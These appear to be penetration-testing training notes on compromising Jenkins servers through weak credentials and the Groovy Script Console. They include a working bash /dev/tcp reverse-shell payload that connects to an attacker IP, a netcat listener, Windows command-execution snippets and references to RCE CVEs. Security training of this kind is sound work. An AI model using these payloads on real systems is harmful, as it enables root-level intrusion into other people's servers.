

## 1. Initial Access & The Core Flaw

- **The Vulnerability:** Jenkins is often left configured with **weak or default credentials**.
    
- **The Goal:** Log in as an administrator to access a powerful built-in developer feature called the **Script Console**.
    
- **Why it's dangerous:** The Script Console allows you to run arbitrary **Apache Groovy** scripts (a Java-compatible language). Since Jenkins often runs with high privileges (`root` on Linux or `SYSTEM` on Windows), code executed here inherits those complete master permissions.
    

## 2. Exploiting Linux-Based Jenkins

### Step 1: Verify Command Execution

Navigate to `http://<TARGET_IP>:8000/script`, paste this basic Groovy script into the console, and click run to verify you can execute system commands (e.g., the `id` command):

Groovy

```
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

### Step 2: Catch a Reverse Shell

1. Open a terminal on your local attack machine and start a Netcat listener:
    
    Bash
    
    ```
    nc -lvnp 8443
    ```
    

```
2. Paste this specific Groovy reverse shell payload into the Jenkins Script Console (replace `10.10.14.15` with your local IP):
   ```groovy
   r = Runtime.getRuntime()
   p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
   p.waitFor()
```

3. Execute the script to receive a full root shell connection back on your Netcat terminal.
    

## 3. Exploiting Windows-Based Jenkins

### Option A: Quick Command Output

If the underlying server is Windows, use this simpler snippet to run commands like `dir` and read the output directly on your browser screen:

Groovy

```
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

### Option B: Establish a Windows Reverse Shell

To catch a persistent connection from a Windows target without modifying the system (avoiding adding new RDP/WinRM users):

1. Setup a local listener on your attack machine.
    
2. Run a **PowerShell download cradle** (like `Invoke-PowerShellTcp.ps1`) using the `cmd.exe /c` script method above, **OR** paste the long standalone **Java reverse shell script** provided in the text into the console, updating the `host` and `port` variables to point back to your local machine.
    

## 4. Other Notable Exploit Flaws (Version-Specific)

If you cannot log in due to strong credentials, older versions of Jenkins may be vulnerable to specific public exploits:

- **Pre-Auth RCE (v2.137 and below):** Combines CVE-2018-1999002 and CVE-2019-1003000 to bypass the security sandbox entirely, allowing unauthenticated attackers to execute malicious code.
    
- **Privileged User Exploit (v2.150.2 and below):** Allows users with job creation privileges (including anonymous users if left enabled by default) to achieve system code execution via Node.js integrations.
